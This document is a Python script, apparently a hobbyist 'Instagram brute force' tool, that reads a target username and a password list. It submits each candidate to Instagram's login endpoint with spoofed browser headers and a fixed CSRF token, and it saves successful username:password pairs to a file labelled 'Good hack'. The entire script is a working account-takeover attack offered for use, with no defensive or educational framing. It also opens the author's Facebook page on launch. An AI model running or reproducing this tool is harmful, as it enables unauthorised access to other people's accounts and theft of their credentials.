import sys , os , threading
import requests , json
import time
from time import sleep
from datetime import datetime
import os
import sys
import webbrowser
import requests
from threading import Thread
import os
import os
try:
	import requests
except:
	os.system("pip install requests")
import requests

import os, sys, time
from time import sleep as timeout
def restart_program():
        python = sys.executable
        os.execl(python, python, * sys.argv)
        curdir = os.getcwd()
def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.05)


# Reset
color_off="\033[0m"       # Text Reset
ipurple="\033[0;95m"      # Purple
ired="\033[0;91m"         # Red
iyellow="\033[0;93m"      # Yellow
iblue="\033[0;94m"        # Blue
icyan="\033[0;96m"        # Cyan
iwhite="\033[0;97m"       # White
igreen="\033[0;92m"       # Green
on_purple="\033[45m"      # Purple
bgreen="\033[1;32m"       # Green
normal_color = "\33[00m"
info_color = "\033[1;33m"
red_color = "\033[1;31m"
green_color = "\033[1;32m"
whiteB_color = "\033[1;37m"
detect_color = "\033[1;34m"
banner_color="\033[1;33;40m"
end_banner_color="\33[00m"
onlyPasswords = False  
r = requests.session()

os.system("clear")
os.system("clear")
print(ired+'''					 𝐎𝐧𝐥𝐢𝐧𝐞    '''+color_off)
time.sleep(5)
os.system("clear")
print(igreen+'''					 𝐎𝐧𝐥𝐢𝐧𝐞        '''+color_off)


psb(iblue+'𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝐑𝐢𝐡𝐚𝐧 𝐈𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦 𝐁𝐫𝐮𝐭𝐞 𝐅𝐨𝐫𝐜𝐞 𝑻𝒐 𝑴𝒚 𝑻𝒐𝒐𝒍𝒔                            '+color_off)

print(detect_color+'''
                               ....
                                    %
                                     ^
                            L
                            "F3  $r
                           $$$$.e$"  .
                           "$$$$$"   "
     (Rihan Ahmed)        $$$$c  /
        .                   $$$$$$$P
       ."c                      $$$
      .$c3b                  ..J$$$$$e
      4$$$$             .$$$$$$$$$$$$$$c
       $$$$b           .$$$$$$$$$$$$$$$$r
          $$$.        .$$$$$$$$$$$$$$$$$$
           $$$c      .$$$$$$$  "$$$$$$$$$r
          
''')


os.system("xdg-open \'https://www.facebook.com/white.hat.hacker.Rihan\'")
print(bgreen+'''        	 Devoloped By: 𝙍𝙞𝙝𝙖𝙣 𝘼𝙝𝙢𝙚𝙙            '''                            +color_off)

print(on_purple+'''			Version : 1.0.0'''+color_off)

print('''────┈┈┈┄┄╌╌╌╌┄┄┈┈┈────•────•────────•────•''')


print('')
user = input (end_banner_color+"Usernames => ")
flo = input ("List Of Passwords => ")
linux = 'clear'
windows = 'cls'


password = open(flo).read().splitlines()
for password in password:
        login_url = 'https://www.instagram.com/accounts/login/ajax/'

        time = int(datetime.now().timestamp())

        payload = {
            'username': user,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{password}',
            'queryParams': {},
            'optIntoOneTap': 'false'
        }

        with requests.Session() as s:
            r = s.post(login_url, data=payload, headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
                "X-Requested-With": "XMLHttpRequest",
                "Referer": "https://www.instagram.com/accounts/login/",
                "x-csrftoken": 'ZxKmz4hXp6XKmTPg9lzgYxXN4sFr2pzo'
            })
        for i in range(2):
            if i ==1:
                os.system([linux, windows][os.name == 'nt'])
                continue
            r=s.post(login_url, data=payload, headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
                "X-Requested-With": "XMLHttpRequest",
                "Referer": "https://www.instagram.com/accounts/login/",
                "x-csrftoken": 'ZxKmz4hXp6XKmTPg9lzgYxXN4sFr2pzo'
            })

            if 'checkpoint_url' in r.text:
                print((normal_color+'' + user + ' : ' + password + ' --> Good hack '))
                with open('good.txt', 'a') as x:
                    x.write(user + ':' + password + '\n')
                    exit()					
            if 'userId' in r.text:
                print((normal_color+'' + user + ' : ' + password + ' --> Good hack '))
                with open('good.txt', 'a') as x:
                    x.write(user + ':' + password + '\n')
            if 'error' in r.text:
                print((normal_color+'' + user + ' : ' + password + ' --> عذرا ، كانت هناك مشكلة في طلبك '))
            elif 'status' in r.text:
              print (end_banner_color + "---------------------------------------")
              print ((red_color + ' --> ' + user + ' : ' + password))
              print ((red_color + ' --> Error '))
              x=(password)
              sleep(1)
              sys.stdout.write(f'\rplease wait ..')
              os.system([linux, windows][os.name == 'nt'])
              print(r.text)

   


